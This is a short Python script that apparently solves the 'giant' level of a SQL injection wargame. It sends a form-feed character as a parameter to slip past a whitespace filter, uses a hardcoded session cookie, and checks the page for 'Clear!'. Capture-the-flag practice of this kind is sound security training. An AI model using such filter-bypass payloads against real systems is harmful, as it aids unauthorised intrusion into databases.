import requests

url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"
cookie = {"PHPSESSID":"7i0pju9093hcuinap2nnrb9jlu"}

if requests.get(url, {"shit":"\f"}, cookies = cookie).text.find("Clear!") > 0: print("[*] Success")
